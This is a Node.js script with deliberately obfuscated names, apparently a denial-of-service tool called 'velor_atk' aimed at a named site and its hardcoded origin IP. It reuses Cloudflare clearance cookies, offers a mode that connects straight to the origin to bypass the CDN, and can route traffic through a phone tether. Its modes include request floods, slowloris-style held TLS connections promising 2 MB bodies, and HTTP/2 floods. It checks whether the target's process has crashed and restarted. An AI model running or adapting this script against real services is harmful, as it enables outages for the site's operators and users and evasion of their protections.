// pagbck ogpc
// myoyyjqs pfgrk ovd
'use strict';
const https=require('https'), tls=require('tls'), zlib=require('zlib'), fs=require('fs');
const { performance } = require('perf_hooks');
try{ if(fs.existsSync('cf_cookie.txt') && !process.env.CF_COOKIE){ process.env.CF_COOKIE=fs.readFileSync('cf_cookie.txt','utf8').trim(); if(fs.existsSync('cf_ua.txt')) process.env.CF_UA=fs.readFileSync('cf_ua.txt','utf8').trim(); } }catch(e){}
const COOKIEFILE=process.env.CF_COOKIE_FILE||null, UAFILE=process.env.CF_UA_FILE||null;
const zmunby=()=>{ if(COOKIEFILE){ try{ return fs.readFileSync(COOKIEFILE,'utf8').trim(); }catch(e){} } return process.env.CF_COOKIE||''; };
const zaohj=()=>{ if(UAFILE){ try{ return fs.readFileSync(UAFILE,'utf8').trim(); }catch(e){} } return process.env.CF_UA||''; };

const zsuiacr=process.argv[2]||'probe';
const zpybfm=parseInt(process.argv[3]||(zsuiacr==='burst'?30:zsuiacr==='ztxajhg'?100:8),10);
const zmajr=parseInt(process.argv[4]||'15',10);
const zqmikyf=process.env.TARGET_HOST||'velor.win', zpzyeb=process.env.TARGET_IP||'57.131.163.31';
const zqthzbv=process.env.LOCAL_IP||null; // optional: bind attack egress to a specific local adapter zpzyeb (e.g. phone tether)
const zuezk=parseInt(process.env.PACE_MS||'0',10);
const znwxx=process.env.ORIGIN_DIRECT==='1'; // bypass Cloudflare: connect straight to the origin zpzyeb, SNI/Host = velor.win
const zeyddra=process.env.zmhqx||`qsbvh_tnjn.out`;
fs.writeFileSync(zeyddra,`velor_atk ${zsuiacr} w=${zpybfm} t=${zmajr}s ${new Date().toISOString()}\n`);
const L=s=>{console.log(s);fs.appendFileSync(zeyddra,s+'\n');};

const zsibdoe = process.env.NO_KEEPALIVE==='1' ? false : new https.Agent({keepAlive:true,maxSockets:512,maxFreeSockets:512});
const zutmsd=JSON.stringify({v:'a'.repeat(24),events:[{e:'x'}]});
const ziwbk=kb=>{const b=JSON.stringify({v:'a'.repeat(24),events:[{e:'x',p:''}]}).length;
  return JSON.stringify({v:'a'.repeat(24),events:[{e:'x',p:'A'.repeat(kb*1024-b)}]});};
const zvvipyb=zlib.gzipSync(zutmsd);
const zkgjsx=ziwbk(12);

function zxkpfr(o={}){
  const {path='/api/health',method='GET',body=null,headers={},timeout=15000}=o;
  return new Promise(res=>{
    const t0=performance.now();
    let fin=false;
    const h={host:zqmikyf,'user-zsibdoe':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36','accept-encoding':'identity','accept':'application/json, text/plain, */*','accept-language':'en-US,en;q=0.9',...headers};
    const CK0=zmunby(); if(CK0){ h.cookie=CK0; const UA0=zaohj(); if(UA0){ h['user-zsibdoe']=UA0; } }
    if(body!=null){ if(!h['content-type']&&!h['content-encoding'])h['content-type']='application/json';
      h['content-length']=Buffer.byteLength(body); }
    const done=v=>{if(fin)return;fin=true;clearTimeout(wd);res(v);};
    const opt={host:znwxx?zpzyeb:zqmikyf,port:443,path,method,zsibdoe,headers:h,localAddress:zqthzbv||undefined};
    if(znwxx)opt.servername=zqmikyf;
    if(zqthzbv){ opt.family = zqthzbv.indexOf(':')>=0 ? 6 : 4; }
    const q=https.request(opt,s=>{
      let n=0,b=''; s.on('data',c=>{n+=c.length;if(b.length<400)b+=c;});
      s.on('end',()=>done({code:s.statusCode,ms:Math.round(performance.now()-t0),bytes:n,
        close:s.headers.connection==='close',cache:s.headers['x-velor-cache'],body:b}));
    });
    // watchdog: plain timer keeps the event loop ref'd even if the socket dies silently
    const wd=setTimeout(()=>{try{q.destroy();}catch(e){}
      done({code:'WD',ms:Math.round(performance.now()-t0),bytes:0});},timeout+500);
    // abrupt close without error/end (velor.win famously does this) -> resolve fast
    q.on('close',()=>setTimeout(()=>done({code:'ABORT',ms:Math.round(performance.now()-t0),bytes:0}),30));
    q.on('error',e=>done({code:'E:'+((e.code||'')+'').slice(0,10),ms:Math.round(performance.now()-t0),bytes:0}));
    if(body!=null)q.write(body);
    q.end();
  });
}

async function zzqqm(){
  const h=await zxkpfr({path:'/api/health',timeout:8000});
  const pid=(h.body||'').match(/"pid":(\d+)/); const up=(h.body||'').match(/"uptime":(\d+)/);
  L(`zzqqm health ${h.code} ${h.ms}ms pid=${pid?pid[1]:'?'} uptime=${up?up[1]:'?'}s`);
  for(const [m,p] of [['GET','/api/track'],['POST','/api/track'],['GET','/api/shop'],
                      ['GET','/api/season'],['GET','/api/economy/leaderboard'],['GET','/']]){
    const r=await zxkpfr({path:p,method:m,body:m==='POST'?zutmsd:null,timeout:8000});
    L(`  ${m} ${p} -> ${r.code} ${r.ms}ms ${r.bytes}B cache=${r.cache||'-'}`);
  }
  return pid?pid[1]:'?';
}

function zqntf(i){
  const c=i%10;
  switch(zsuiacr){
    case 'track204': case 'burst': return {path:'/api/track',method:'POST',body:zutmsd};
    case 'track500': return {path:'/api/track',method:'POST',body:(process.env.RANDV==='1'?JSON.stringify({v:Array.from({length:24},()=>'0123456789abcdef'[(Math.random()*16)|0]).join(''),events:[{e:'x',p:'A'.repeat(12220)}]}):zkgjsx)};
    case 'trackerr':{ const r=i%3;
      if(r===0)return{path:'/api/track',method:'POST',body:'{oops'};
      if(r===1)return{path:'/api/track',method:'POST',body:'a=1',
        headers:{'content-type':'application/x-www-form-urlencoded'}};
      return{path:'/api/track',method:'POST',body:zvvipyb,
        headers:{'content-encoding':'gzip','content-type':'application/json'}}; }
    case 'lb':   return {path:'/api/economy/leaderboard?x='+i+'-'+Math.random().toString(36).slice(2,8),method:'GET'};
    case 'shop': return {path:'/api/shop',method:'GET'};
    case 'mixed':
      if(c<5)return{path:'/api/track',method:'POST',body:zkgjsx};
      if(c<8)return{path:'/api/economy/leaderboard?x='+i+'-'+Math.random().toString(36).slice(2,8),method:'GET'};
      if(c<9)return{path:'/api/shop',method:'GET'};
      return{path:'/api/track',method:'POST',body:'{oops'};
    case 'static': return {path:'/robots.txt',method:'GET'};
    case 'favicon': return {path:'/favicon.png',method:'GET'};
    case 'root': return {path:'/',method:'GET'};
    case 'etk4':{ const c=i%10;
      if(c<4)return{path:'/',method:'GET'};
      if(c<7)return{path:'/api/matches',method:'GET'};
      if(c<9)return{path:'/api/leaderboard/teams',method:'GET'};
      return{path:'/api/leaderboard',method:'GET'}; }
    case 'etk3':{ const c=i%10;
      if(c<5)return{path:'/api/matches',method:'GET'};
      if(c<7)return{path:'/api/leaderboard/teams',method:'GET'};
      if(c<8)return{path:'/api/leaderboard',method:'GET'};
      return{path:'/api/auth/user',method:'GET'}; }
    case 'etk':{ const c=i%5;
      if(c<2)return{path:'/',method:'GET'};
      if(c<3)return{path:'/favicon.ico',method:'GET'};
      if(c<4)return{path:'/manifest.json',method:'GET'};
      return{path:'/apple-touch-icon.png',method:'GET'}; }
    case 'free':{ const c=i%10;
      if(c<5)return{path:'/sitemap.xml',method:'GET'};
      if(c<9)return{path:'/manifest.json',method:'GET'};
      return{path:'/favicon.ico',method:'GET'}; }
    case 'ssr':    return {path:'/',method:'GET'};
    case 'ssr2':   return {path:'/leaderboard',method:'GET'};
    case 'bundle': return {path:'/assets/index-CYtIz3va.js',method:'GET',
      headers:i%2?{'accept-encoding':'gzip'}:{'accept-encoding':'identity'}};
    case 'ws':     return {path:'/socket.io/?EIO=4&transport=polling&x='+i,method:'GET'};
    case 'pop':    return {path:'/api/popup/stat',method:'POST',
      body:JSON.stringify({id:'atk'+i,kind:'click'})};
    case 'writemix':{ const c=i%10;
      if(c<4)return{path:'/api/track',method:'POST',
        body:JSON.stringify({v:(i.toString(16)+'aaa').slice(0,8)+'a'.repeat(16),events:[{e:'x'}]})};
      if(c<7)return{path:'/api/popup/stat',method:'POST',
        body:JSON.stringify({id:'atk'+i,kind:'click'})};
      return{path:'/socket.io/?EIO=4&transport=polling&x='+i,method:'GET'}; }
    case 'melt':{ const c=i%20;
      if(c<8)return{path:'/socket.io/?EIO=4&transport=polling&x='+i,method:'GET'};
      if(c<15)return{path:'/assets/index-CYtIz3va.js?x='+i,method:'GET'};
      return{path:'/api/track',method:'POST',
        body:JSON.stringify({v:(i.toString(16)+'melt').slice(0,8)+'a'.repeat(16),events:[{e:'x'}]})}; }
    default: return {path:'/api/health',method:'GET'};
  }
}

async function ztxajhg(){
  const keep=[]; let opened=0,fail=0;
  const one=()=>new Promise(done=>{
    let fin=false;
    const s=tls.connect({host:znwxx?zpzyeb:zqmikyf,port:443,servername:zqmikyf,rejectUnauthorized:false,localAddress:zqthzbv||undefined});
    const iv=setInterval(()=>{try{s.write(' ');}catch(e){}},7000);
    s.on('close',()=>clearInterval(iv));
    const end=ok=>{if(fin)return;fin=true;ok?opened++:fail++;done();};
    s.setTimeout(15000);
    s.once('secureConnect',()=>{
      const CK0=zmunby(); const CK=CK0?('Cookie: '+CK0+'\r\n'):'';
      s.write('POST /api/track HTTP/1.1\r\nHost: velor.win\r\nUser-Agent: '+(process.env.CF_UA||'atk-ztxajhg/1')+'\r\n'+
        'Content-Type: application/json\r\n'+CK+'Content-Length: 2097152\r\nConnection: keep-alive\r\n\r\n{');
      keep.push(s); end(true);
    });
    s.once('error',()=>end(false));
    s.once('timeout',()=>end(false));
  });
  const gap=Math.max(0,15000/zpybfm);
  for(let i=0;i<zpybfm;i++){ one(); if(gap>1)await new Promise(r=>setTimeout(r,gap)); }
  L(`ztxajhg: attempted=${zpybfm} opened=${opened} failed=${fail}`);
  const t=setInterval(async()=>{const alive=keep.filter(s=>!s.destroyed).length;
    const p=await zxkpfr({path:'/api/health',timeout:8000});
    L(`  held=${alive} health=${p.code}/${p.ms}ms`);},5000);
  await new Promise(r=>setTimeout(r,zmajr*1000));
  clearInterval(t);
  keep.forEach(s=>{try{s.destroy();}catch(e){}});
  await new Promise(r=>setTimeout(r,2000));
  const p=await zxkpfr({path:'/api/health',timeout:8000}); L(`post-release health ${p.code} ${p.ms}ms`);
}

async function zmjoheq(){
  const http2=require('http2');
  const endAt=Date.now()+zmajr*1000; let sent=0,abort=0; const codes={};
  const worker=async()=>{
    let conn=null;
    const ready=()=>new Promise(r=>{conn=http2.connect(znwxx?'https://'+zpzyeb:'https://velor.win',{servername:zqmikyf,localAddress:zqthzbv||undefined});conn.once('connect',r);conn.once('error',r);});
    await ready();
    while(Date.now()<endAt){
      const t0w=Date.now();
      try{
        sent++;
        const st=conn.request({':method':'POST',':path':'/api/track',':authority':zqmikyf,'content-type':'application/json','user-zsibdoe':zaohj()||'atk-h2/1','accept-encoding':'identity','accept':'application/json, text/plain, */*',...(zmunby()?{cookie:zmunby()}:{})});
        const p=new Promise(res=>{st.on('response',h=>{st.resume();res(h[':status']);});st.on('error',()=>res('E'));st.on('close',()=>res('ABORT'));});
        st.write(zsuiacr==='h2trk'?zkgjsx:zutmsd); st.end();
        const c=await p; codes[c]=(codes[c]||0)+1;
        if(c==='E'||c==='ABORT'){abort++;try{conn.close();}catch(e){} await ready();}
      }catch(e){abort++;try{conn.close();}catch(_){} await ready();}
      if(zuezk>0){const el=Date.now()-t0w; if(el<zuezk)await new Promise(r=>setTimeout(r,zuezk-el));}
    }
    try{conn.close();}catch(e){}
  };
  const mon=setInterval(async()=>{const p=await zxkpfr({path:'/api/health',timeout:8000});L(`  t+${zmajr-Math.round((endAt-Date.now())/1000)}s health=${p.code}/${p.ms}ms`);},5000);
  await Promise.all(Array.from({length:zpybfm},(_,w)=>worker(w)));
  clearInterval(mon);
  L(`h2 sent=${sent} (${(sent/zmajr).toFixed(1)}/s) codes=${JSON.stringify(codes)} aborts=${abort}`);
}

(async()=>{
  L(`== velor_atk ${zsuiacr} - ${zpybfm} workers ${zmajr}s ==`);
  const pid0=await zzqqm();
  if(zsuiacr==='probe'){L('done');return;}
  if(zsuiacr==='ztxajhg'){await ztxajhg();L('done');return;}
  if(zsuiacr==='h2'||zsuiacr==='h2trk'){await zmjoheq();const p1=await zzqqm();L(pid0===p1?'pid stable':(p1==='?'?'pid unreadable at post-check (health no-answer)':'PID CHANGED '+pid0+'->'+p1));L('done');return;}
  const endAt=Date.now()+zmajr*1000; let sent=0,closes=0; const codes={}; let first429=null;
  const mon=setInterval(async()=>{const p=await zxkpfr({path:'/api/health',timeout:8000});
    L(`  t+${zmajr-Math.round((endAt-Date.now())/1000)}s health=${p.code}/${p.ms}ms`);},5000);
  const st=setInterval(()=>{L(`  stats sent=${sent} codes=${JSON.stringify(codes)} closes=${closes}`);},30000);
  const worker=async w=>{let i=0;while(Date.now()<endAt){
    const t0w=Date.now(); const r=await zxkpfr(zqntf(w*9973+i++)); sent++;
    codes[r.code]=(codes[r.code]||0)+1; if(r.close)closes++;
    if(r.code===429&&first429===null)first429=sent; if(zuezk>0){const el=Date.now()-t0w; if(el<zuezk)await new Promise(rr=>setTimeout(rr,zuezk-el));}}};
  await Promise.all(Array.from({length:zpybfm},(_,w)=>worker(w)));
  clearInterval(mon);clearInterval(st);
  L(`sent=${sent} (${(sent/zmajr).toFixed(1)}/s) codes=${JSON.stringify(codes)} conn-close=${closes} first429@zxkpfr=${first429??'-'}`);
  const pid1=await zzqqm();
  L(pid0===pid1?`pid stable (${pid0}) - no restart`:(pid1==='?'?`pid unreadable at post-check (health no-answer); zzqqm pid was ${pid0}`:`PID CHANGED ${pid0} -> ${pid1} - app restarted!`));
  L('done');
})().catch(e=>L('FATAL '+e.message));

// ghdoc-ocadmwy
